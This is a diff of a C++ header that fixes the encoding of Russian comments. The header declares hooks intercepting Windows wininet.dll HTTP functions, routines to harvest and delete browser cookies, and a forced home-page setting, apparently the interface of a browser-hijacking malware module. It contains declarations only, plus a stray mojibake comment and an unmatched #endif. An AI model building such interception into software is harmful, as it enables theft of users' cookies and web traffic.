@@ -1,5 +1,5 @@
 /*
-  РџРµСЂРµС…РІР°С‚ wininet.dll
+  Перехват wininet.dll
 */
 #pragma once
 
@@ -7,69 +7,69 @@
 namespace WininetHook
 {
   /*
-    РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
+    Инициализация.
 
-    IN homePage - РїСЂРёРЅСѓРґРёС‚РµР»СЊРЅР°СЏ СѓСЃС‚Р°РЅРѕРІРєР° РґРѕРјР°С€РЅРµР№ СЃС‚СЂР°РЅРёС†С‹, РµСЃР»Рё NULL РёР»Рё [0]=0, С‚Рѕ РЅРµ РїСЂРёРјРµРЅСЏРµС‚СЃСЏ.
+    IN homePage - принудительная установка домашней страницы, если NULL или [0]=0, то не применяется.
   */
   void init(const LPWSTR homePage);
 
   /*
-    Р”РµРёРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
+    Деинициализация.
   */
   void uninit(void);
 
   /*
-    РџРѕР»СѓС‡РµРЅРёРµ РєСѓРєРѕРІ Wininet.
+    Получение куков Wininet.
   */
   void _getCookies(void);
 
   /*
-    РЈРґР°Р»РµРЅРёРµ РєСѓРєРѕРІ Wininet.
+    Удаление куков Wininet.
   */
   void _removeCookies(void);
 
   /*
-    РџРµСЂРµС…РІР°С‚С‡РёРє HttpSendRequestW.
+    Перехватчик HttpSendRequestW.
   */
   BOOL WINAPI hookerHttpSendRequestW(HINTERNET request, LPWSTR headers, DWORD headersLength, LPVOID optional, DWORD optionalLength);
   
   /*
-    РџРµСЂРµС…РІР°С‚С‡РёРє HttpSendRequestA.
+    Перехватчик HttpSendRequestA.
   */
   BOOL WINAPI hookerHttpSendRequestA(HINTERNET request, LPSTR headers, DWORD headersLength, LPVOID optional, DWORD optionalLength);
   
   /*
-    РџРµСЂРµС…РІР°С‚С‡РёРє HttpSendRequestExW.
+    Перехватчик HttpSendRequestExW.
   */
   BOOL WINAPI hookerHttpSendRequestExW(HINTERNET request, LPINTERNET_BUFFERSW buffersIn, LPINTERNET_BUFFERSW buffersOut, DWORD flags, DWORD_PTR context);
   
   /*
-    РџРµСЂРµС…РІР°С‚С‡РёРє HttpSendRequestExA.
+    Перехватчик HttpSendRequestExA.
   */
   BOOL WINAPI hookerHttpSendRequestExA(HINTERNET request, LPINTERNET_BUFFERSA buffersIn, LPINTERNET_BUFFERSA buffersOut, DWORD flags, DWORD_PTR context);
 
   /*
-    РџРµСЂРµС…РІР°С‚С‡РёРє InternetCloseHandle.
+    Перехватчик InternetCloseHandle.
   */
   BOOL WINAPI hookerInternetCloseHandle(HINTERNET handle);
 
   /*
-    РџРµСЂРµС…РІР°С‚С‡РёРє InternetReadFile.
+    Перехватчик InternetReadFile.
   */
   BOOL WINAPI hookerInternetReadFile(HINTERNET handle, LPVOID buffer, DWORD numberOfBytesToRead, LPDWORD numberOfBytesReaded);
 
   /*
-    РџРµСЂРµС…РІР°С‚С‡РёРє InternetReadFileExA. РўР°РєР¶Рµ РІС‹Р·С‹РІР°РµС‚СЃСЏ РѕС‚ InternetReadFileExW
+    Перехватчик InternetReadFileExA. Также вызывается от InternetReadFileExW
   */
   BOOL WINAPI hookerInternetReadFileExA(HINTERNET handle, LPINTERNET_BUFFERSA buffersOut, DWORD flags, DWORD_PTR context);
 
   /*
-    РџРµСЂРµС…РІР°С‚С‡РёРє InternetQueryDataAvailable.
+    Перехватчик InternetQueryDataAvailable.
   */
   BOOL WINAPI hookerInternetQueryDataAvailable(HINTERNET handle, LPDWORD numberOfBytesAvailable, DWORD flags, DWORD_PTR context);
   
-  /*Р’В Р’В Р’В Р’В Interceptor HttpQueryInfoA. Also called on HttpQueryInfoW.
-Р’В Р’В */
+  /*В В В В Interceptor HttpQueryInfoA. Also called on HttpQueryInfoW.
+В В */
   BOOL WINAPI hookerHttpQueryInfoA(HINTERNET request, DWORD infoLevel, LPVOID buffer, LPDWORD bufferLength, LPDWORD index);
 };
 #endif
